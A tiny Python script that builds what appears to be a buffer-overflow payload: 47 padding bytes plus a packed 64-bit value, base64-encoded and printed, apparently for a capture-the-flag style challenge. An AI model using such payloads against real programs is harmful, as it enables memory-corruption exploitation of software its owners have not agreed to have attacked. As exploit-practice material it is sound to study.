
import sys
import struct
import base64

buf = b'KKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKKK'
buf += struct.pack('<Q', 1402138965931811971)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
